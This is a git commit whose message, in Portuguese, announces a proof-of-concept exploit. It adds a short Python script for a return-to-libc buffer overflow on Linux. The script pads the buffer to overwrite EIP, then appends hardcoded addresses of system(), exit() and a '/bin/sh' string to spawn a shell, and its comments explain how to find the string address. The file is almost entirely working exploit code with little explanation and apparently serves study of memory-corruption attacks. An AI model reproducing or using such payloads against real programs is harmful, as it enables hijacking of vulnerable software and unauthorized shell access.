1f9473576c1efadab6c0840f0e43b229f6340b27
trashoverride <jr.overhead@gmail.com>
2016-11-07 16:24:23 -0200

    adicionando exploit do PoC

---
+++ Linux/return_libc/expl.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python
+#
+#Antes de usar 
+#exporte a variavel export SHELL=/bin/bash
+#utilize cacth SHELL para pegar o endereco
+#use o endereco da string
+
+
+#system() function address in the system
+SYSTEM_ADDR =  "\xe0\x03\xe5\xb7"
+
+#exit() function address in the system
+EXIT_ADDR   =  "\xb0\x31\xe4\xb7"
+
+#address of SHELL = "/bin/sh"
+BASH_STRING =  "\x19\xf7\xff\xbf"
+
+#trash until stop in the EIP 
+
+
+buffer = "a"* 22
+
+buffer = buffer + SYSTEM_ADDR + EXIT_ADDR + BASH_STRING
+
+print buffer
